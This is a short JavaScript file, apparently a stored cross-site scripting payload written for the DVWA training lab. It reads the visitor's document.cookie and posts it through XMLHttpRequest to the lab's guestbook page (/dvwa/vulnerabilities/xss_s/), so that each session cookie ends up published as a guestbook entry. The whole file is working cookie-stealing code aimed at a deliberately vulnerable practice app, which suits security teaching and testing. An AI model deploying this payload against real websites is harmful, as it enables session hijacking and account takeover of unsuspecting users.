var x;
var params= "txtName=cookie_test&mtxMessage=the%20user%20cookie%20is%20"+encodeURIComponent(document.cookie)+"&btnSign=Sign+Guestbook";

if (window.XMLHttpRequest) { 
	//alert("no IE!");
	try {
		x= new XMLHttpRequest();
		x.open('POST','/dvwa/vulnerabilities/xss_s/',true);
		x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		x.setRequestHeader('Content-length', params.length);  
		x.setRequestHeader("Connection", "close");
		x.onreadystatechange = function() {
		if(x.readyState == 4 && x.status == 200){}
		};
		x.send(params); 

		
	} catch (e) {
		alert("faile to create  XMLHttpRequest");
	} 
} else {
	/* x = new ActiveXObject("Microsoft.XMLHTTP"); */
}






